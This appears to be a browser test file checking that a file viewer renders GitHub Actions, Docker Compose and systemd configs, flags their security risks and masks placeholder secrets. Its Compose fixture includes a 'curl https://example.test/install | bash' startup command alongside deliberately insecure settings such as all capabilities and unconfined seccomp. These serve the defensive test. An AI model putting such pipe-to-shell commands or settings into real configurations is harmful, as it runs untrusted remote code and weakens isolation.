const GHA_SOURCE = `name: nested-fidelity
on: workflow_dispatch
permissions:
  contents: read
  issues: none
env:
  PUBLIC_MODE: safe
jobs:
  build:
    permissions:
      packages: write
      id-token: none
    env:
      JOB_TOKEN: job-secret-sentinel
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@0123456789012345678901234567890123456789
      - name: nested environment
        env:
          STEP_PASSWORD: step-secret-sentinel
        run: echo ready
`;

const COMPOSE_SOURCE = `services:
  risky:
    image: alpine:3.20
    user: "0:0"
    command: ["sh", "-c", "curl https://example.test/install | bash"]
    read_only: false
    privileged: false
    cap_add: [ALL]
    security_opt:
      - seccomp=unconfined
    devices:
      - /dev/kvm:/dev/kvm
    environment:
      API_TOKEN: compose-secret-sentinel
    secrets:
      - db_password
secrets:
  db_password:
    file: ./password.txt
`;

const SYSTEMD_SOURCE = `[Unit]
Description=Fidelity service
X-FidelityUnit=unit-sentinel

[Service]
ExecStartPre=/usr/bin/prepare-fidelity
ExecStart=/usr/bin/fidelity-server
DynamicUser=yes
ProtectKernelTunables=yes
RestrictAddressFamilies=AF_UNIX AF_INET
SystemCallFilter=@system-service
MemoryDenyWriteExecute=no
Environment=API_TOKEN=systemd-secret-sentinel

[Install]
WantedBy=multi-user.target

[X-Fidelity]
Sentinel=extension-section-sentinel
`;

async function renderDirect(page, modulePath, intake) {
  return page.evaluate(async ({ modulePath: path, intake: value }) => {
    document.getElementById('enhanced-fidelity-probe')?.remove();
    const module = await import(path);
    const rendered = await module.render(value, { settings: {} });
    const probe = document.createElement('div');
    probe.id = 'enhanced-fidelity-probe';
    probe.style.cssText = 'position:fixed;inset:0;z-index:2147483647;overflow:auto;background:var(--bg,#fff)';
    if (rendered.parentNode) probe.appendChild(rendered.parentNode);
    else probe.innerHTML = rendered.bodyHtml || '';
    document.body.appendChild(probe);
    return true;
  }, { modulePath, intake });
}

async function probe(page) {
  return page.$eval('#enhanced-fidelity-probe', (root) => ({
    text: (root.textContent || '').replace(/\s+/g, ' ').trim(),
    sourceOpen: root.querySelector('.kf-source-details')?.open ?? null,
    sourceText: root.querySelector('.kf-source-details')?.textContent || '',
    overflow: Math.max(0, root.scrollWidth - root.clientWidth),
  }));
}

export async function run(ctx) {
  const { page, origin, pass, fail } = ctx;
  const consoleStart = ctx.consoleErrors.length;
  const offOriginStart = ctx.offOrigin.length;
  await page.goto(origin, { waitUntil: 'load' });

  await renderDirect(page, '/types/text/yaml/known/github-actions/renderer.js', {
    text: GHA_SOURCE,
    filename: '.github/workflows/fidelity.yml',
  });
  const gha = await page.$eval('#enhanced-fidelity-probe', (root) => ({
    text: (root.textContent || '').replace(/\s+/g, ' ').trim(),
    envRows: [...root.querySelectorAll('.gha-sec')]
      .find((section) => section.querySelector('.gha-sec-hd')?.textContent?.startsWith('Environment Variables'))
      ?.querySelectorAll('li').length || 0,
    permissionRows: [...root.querySelectorAll('.gha-sec')]
      .find((section) => section.querySelector('.gha-sec-hd')?.textContent?.startsWith('Permissions'))
      ?.querySelectorAll('li').length || 0,
    sourceOpen: root.querySelector('.kf-source-details')?.open,
    sourceText: root.querySelector('.kf-source-details')?.textContent || '',
  }));
  if (gha.envRows === 3 && /workflow/.test(gha.text) && /job build/.test(gha.text)
    && /step in build/.test(gha.text) && /JOB_TOKEN/.test(gha.text) && /STEP_PASSWORD/.test(gha.text)) {
    pass('GitHub Actions enhanced view accounts for workflow, job, and step environment scopes');
  } else fail('GitHub Actions nested environment accounting: ' + JSON.stringify(gha).slice(0, 1200));
  if (gha.permissionRows === 4 && /contents.*read|read.*contents/.test(gha.text)
    && /issues.*none|none.*issues/.test(gha.text) && /packages.*write|write.*packages/.test(gha.text)
    && /broad permission/.test(gha.text)) {
    pass('GitHub Actions enhanced view exposes read/none/write permissions with their owning scopes');
  } else fail('GitHub Actions permission accounting: ' + JSON.stringify(gha).slice(0, 1200));
  if (!gha.sourceOpen && !/job-secret-sentinel|step-secret-sentinel/.test(gha.text + gha.sourceText)
    && (gha.text.match(/\*{8}/g) || []).length >= 2) {
    pass('GitHub Actions nested secret-like values are masked in summary and collapsed source');
  } else fail('GitHub Actions nested secret masking: ' + JSON.stringify(gha).slice(0, 1200));

  await renderDirect(page, '/types/text/yaml/known/docker-compose/render.js', { text: COMPOSE_SOURCE });
  const compose = await probe(page);
  if (/command/.test(compose.text) && /read only/.test(compose.text) && /add capabilities/.test(compose.text)
    && /security options/.test(compose.text) && /devices/.test(compose.text) && /secrets/.test(compose.text)) {
    pass('Compose enhanced service cards expose runtime, isolation, device, and secret declarations');
  } else fail('Compose security-critical fields: ' + compose.text.slice(0, 1400));
  if (/added capabilities/.test(compose.text) && /unconfined security/.test(compose.text)
    && /host devices/.test(compose.text) && /root user/.test(compose.text)
    && /network shell/.test(compose.text)) {
    pass('Compose review calls out capability, confinement, device, root, and startup-shell risks');
  } else fail('Compose risk review: ' + compose.text.slice(0, 1600));
  if (!compose.sourceOpen && !/compose-secret-sentinel/.test(compose.text + compose.sourceText)
    && /API_TOKEN=\*{8}/.test(compose.text)) {
    pass('Compose mapping-form secrets are masked in service cards and collapsed source');
  } else fail('Compose mapping-form secret masking: ' + JSON.stringify(compose).slice(0, 1500));

  await renderDirect(page, '/types/text/known/systemd-unit/renderer.js', { text: SYSTEMD_SOURCE, filename: 'fidelity.service' });
  const systemd = await probe(page);
  if (/ExecStartPre/.test(systemd.text) && /X-FidelityUnit/.test(systemd.text)
    && /\[X-Fidelity\]/.test(systemd.text) && /extension-section-sentinel/.test(systemd.text)) {
    pass('systemd enhanced cards retain unlisted directives and extension sections');
  } else fail('systemd omitted source semantics: ' + systemd.text.slice(0, 1600));
  if (/5 hardening settings/.test(systemd.text) && /hardening disabled/.test(systemd.text)
    && /MemoryDenyWriteExecute=no/.test(systemd.text)) {
    pass('systemd hardening count includes modern settings and distinguishes explicit disabling');
  } else fail('systemd hardening semantics: ' + systemd.text.slice(0, 1600));
  if (!systemd.sourceOpen && !/systemd-secret-sentinel/.test(systemd.text + systemd.sourceText)
    && /API_TOKEN=\*{8}/.test(systemd.text) && /secret-like value masked/.test(systemd.text)) {
    pass('systemd inline secret-like environment values are masked in cards and collapsed source');
  } else fail('systemd inline environment masking: ' + JSON.stringify(systemd).slice(0, 1500));

  await page.setViewportSize({ width: 390, height: 844 });
  const mobileCases = [
    ['/types/text/yaml/known/github-actions/renderer.js', { text: GHA_SOURCE, filename: '.github/workflows/fidelity.yml' }],
    ['/types/text/yaml/known/docker-compose/render.js', { text: COMPOSE_SOURCE }],
    ['/types/text/known/systemd-unit/renderer.js', { text: SYSTEMD_SOURCE, filename: 'fidelity.service' }],
  ];
  const overflows = [];
  for (const [modulePath, intake] of mobileCases) {
    await renderDirect(page, modulePath, intake);
    const layout = await probe(page);
    if (layout.overflow > 1) overflows.push({ modulePath, overflow: layout.overflow });
  }
  if (!overflows.length) pass('security-critical enhanced summaries remain in bounds at 390px');
  else fail('enhanced security summary mobile overflow: ' + JSON.stringify(overflows));

  const errors = ctx.consoleErrors.slice(consoleStart);
  const offOrigin = ctx.offOrigin.slice(offOriginStart);
  if (!errors.length) pass('enhanced security fidelity cases produced no console/page errors');
  else fail('enhanced security fidelity errors: ' + errors.join(' | '));
  if (!offOrigin.length) pass('enhanced security fidelity cases made zero off-origin requests');
  else fail('enhanced security fidelity off-origin requests: ' + offOrigin.join(', '));
}
